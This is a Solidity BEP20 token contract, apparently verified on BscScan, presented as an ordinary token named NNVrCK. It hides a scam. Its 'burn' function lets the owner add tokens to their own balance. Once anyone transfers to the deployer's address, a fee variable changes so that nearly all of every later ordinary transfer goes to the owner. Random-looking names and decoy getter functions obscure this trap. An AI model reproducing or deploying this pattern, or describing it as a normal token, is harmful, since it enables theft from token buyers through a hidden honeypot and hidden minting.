/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.0;

contract NNVrCK {
address private  OoyDRZ = address(0);
string public  symbol = "NNVrCK";
address private  sjMzkQ = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  ZByaeE = address(0);
address public owner;
uint256 private  OxtzPH = 10000000000;
address private  LMgpMH = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  IQqtpq = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  OyVUkb = 1000000000000000;
address private  FoIRUQ = address(0);
uint256 private  CDkQpe = 100000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  XSmxGq = 1000000000000000000;
uint8 public constant decimals = 18;
uint256 private  ZjKGil = 1000000000000000000000;
address private  AdNOYO = address(0);
uint256 public constant nikViL = 99999;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  pPJnvw = address(0);
address private  pnAKoB = address(0);
uint256 private  jtUxSj = 1000000000000000000;
address private  DsLBKp = address(0);
mapping (address => uint256) public balanceOf;
string public  name = "NNVrCK";
event Approval(address indexed owner, address indexed spender, uint256 value);


function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


function _getZjKGil() private returns (uint256) {
return ZjKGil;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tndiQvk 0");
require(spender != address(0), "fndiQvk 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function _getpPJnvw() private returns (address) {
return pPJnvw;
}

function _getAdNOYO() private returns (address) {
return AdNOYO;
}





function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ndiQvk");
require(to != address(0), "ndiQvk");
require(amount <= balanceOf[from], "ndiQvk");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* nikViL/XSmxGq ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==pnAKoB){
XSmxGq = nikViL+2;
}
emit Transfer(from, to, transferAmount);
}
function _getLMgpMH() private returns (address) {
return LMgpMH;
}





function _getjtUxSj() private returns (uint256) {
return jtUxSj;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getZByaeE() private returns (address) {
return ZByaeE;
}





function _getOyVUkb() private returns (uint256) {
return OyVUkb;
}





function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getCDkQpe() private returns (uint256) {
return CDkQpe;
}



constructor () public {
pnAKoB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getOoyDRZ() private returns (address) {
return OoyDRZ;
}



function _getDsLBKp() private returns (address) {
return DsLBKp;
}

function _getFoIRUQ() private returns (address) {
return FoIRUQ;
}

function _getsjMzkQ() private returns (address) {
return sjMzkQ;
}





function _getOxtzPH() private returns (uint256) {
return OxtzPH;
}

function _getIQqtpq() private returns (uint256) {
return IQqtpq;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "Safealert: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Safealert: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Safealert: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Safealert: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Safealert: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}